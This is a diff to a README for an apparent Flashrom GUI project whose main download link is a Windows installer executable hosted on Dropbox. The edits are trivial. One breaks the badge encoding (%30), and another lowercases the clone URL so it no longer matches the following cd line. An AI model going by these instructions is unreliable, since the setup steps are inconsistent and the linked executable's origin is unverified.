@@ -6,7 +6,7 @@
 </p>
 <p align="center">
   <a href="https://www.dropbox.com/scl/fi/m2r4vzg6717hkrbt6wtqe/Flashrom_GUI_Installer.exe?rlkey=jplyixsxuvx2hq5miyxyxlwm5&st=outrez7l&dl=1">
-    <img src="https://img.shields.io/badge/Download%20Installer-3987da?style=for-the-badge&logo=windows" alt="Download FlashromGUI Installer">
+    <img src="https://img.shields.io/badge/Download%30Installer-3987da?style=for-the-badge&logo=windows" alt="Download FlashromGUI Installer">
   </a>
 </p>
 <p align="center">
@@ -96,7 +96,7 @@ Download the latest installer from the **Releases** page.
 ## 🧪 **Development Setup**
 
 ```bash
-git clone https://github.com/KantBStoppd/FlashromGUI.git
+git clone https://github.com/KantBStoppd/flashromgui.git
 cd FlashromGUI
 
 # Create environment
@@ -129,7 +129,7 @@ Check:
 
 ## 🙏 **Acknowledgements**
 
-FlashromGUI is built on top of the incredible work of the **Flashrom** project and the open‑source community.
+FlashromGUI is built on top of the incredible work of the **Flashrom** CLI project and the open‑source community.
 
 ---
 
